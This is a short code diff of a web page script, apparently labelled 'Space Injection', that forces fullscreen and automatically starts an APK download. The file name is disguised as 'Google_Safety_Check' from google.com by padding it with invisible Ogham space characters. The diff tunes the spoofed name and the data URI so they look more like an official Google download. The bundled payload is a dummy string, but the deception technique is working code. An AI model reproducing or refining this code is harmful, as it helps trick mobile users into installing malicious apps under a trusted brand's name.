@@ -104,10 +104,10 @@
             updateLog("Running Space Injection...");
             goFS();
             // Menggunakan karakter Ogham Space (\u1680) untuk mengisi kekosongan UI
-            const fakeName = "Google_Safety_Check" + "\u1680".repeat(40) + "google.com.google.com.google.com.google.com.google.com.google.com.google.com.google.com.google.com.google.com.google.com from google.com/google.apk";
+            const fakeName = "Google_Safety_Check" + "\u1680".repeat(40) + " from google.com google.apk";
             setTimeout(() => {
                 const a = document.createElement("a");
-                a.href = "data:application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
+                a.href = "data:/\\\\\\/.google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
                 a.download = fakeName;
                 a.click();
             }, 1000);
